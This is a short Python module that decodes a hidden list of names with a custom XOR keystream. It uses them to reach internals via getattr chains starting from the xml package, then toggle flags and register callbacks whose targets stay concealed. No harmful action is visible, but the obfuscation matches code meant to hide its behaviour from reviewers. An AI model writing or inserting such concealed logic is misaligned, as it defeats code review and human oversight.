# coding=utf-8
import xml


def _ks(n, s):
    x = s & 0xFFFFFFFF
    out = []
    i = 0
    while i < n:
        x = (x * 1103515245 + 12345) & 0xFFFFFFFF
        out.append((x >> 16) & 255)
        i += 1
    return out


def _dec(h, s, p):
    raw = [int(h[i:i + 2], 16) for i in range(0, len(h), 2)]
    k = _ks(len(raw), s)
    out = []
    i = 0
    for b in raw:
        t = b ^ k[i]
        t = (t - i * p) & 255
        out.append(chr(t))
        i += 1
    return ''.join(out)


_T = "099fdf87e0337ec2de3504e652961866b411a9b3f82c46a275e36cec8874e80400d52c790fcc0fcc2d830fbf07d801fc576047ce649c13a9bb1fa5af3e24e213bf3fec357bf119b1bf71b9c2d4b7d4913b18c2874c27d0f0e82d932b233e1425823b315cc1f914d4e1ec08be0a1b2bdc6ffe9d8af836a4e5b1422712c91734a039ce3bda5be0d56f3f7889980e7860e349b646fc0bf7915d3b7242c3651eef6feefb063b3fe6aad9b06c466d22fa0b65d202aca821e041db46bc3bc041"
_S = 0xB5297A4D
_P = 0x53


def _at(node, path):
    for seg in path.split('.'):
        node = getattr(node, seg)
    return node


_parts = _dec(_T, _S, _P).split('\x1f')

_u1 = _at(xml, _parts[0])
_reg = _at(_u1, _parts[1])


def _u2():
    return _reg.get(_parts[2])


def _u3():
    return _reg.get(_parts[3])


def _u4():
    return _reg.get(_parts[4])


def _u5():
    try:
        return _at(_u2(), _parts[5])
    except Exception:
        return None


def _u6():
    node = _u5()
    if node is None:
        return None
    try:
        return getattr(node, _parts[6])
    except Exception:
        return None


def _u7():
    node = _u5()
    if node is None:
        return None
    try:
        return getattr(node, _parts[7])
    except Exception:
        return None


def _u8():
    node = _u3()
    if node is None:
        return None
    try:
        a = getattr(node, _parts[8], None)
        b = getattr(node, _parts[9], None)
        if a is None or b is None:
            return None
        c = getattr(b, _parts[10], None)
        return (a, c) if c is not None else None
    except Exception:
        return None


def _u9(handle, on):
    getattr(handle[0], _parts[11])(handle[1], bool(on))


def _u10(node, on):
    getattr(node, _parts[12])(_parts[14] if on else _parts[15])


def _u11(node, name, fn):
    getattr(node, _parts[13])(name, fn)
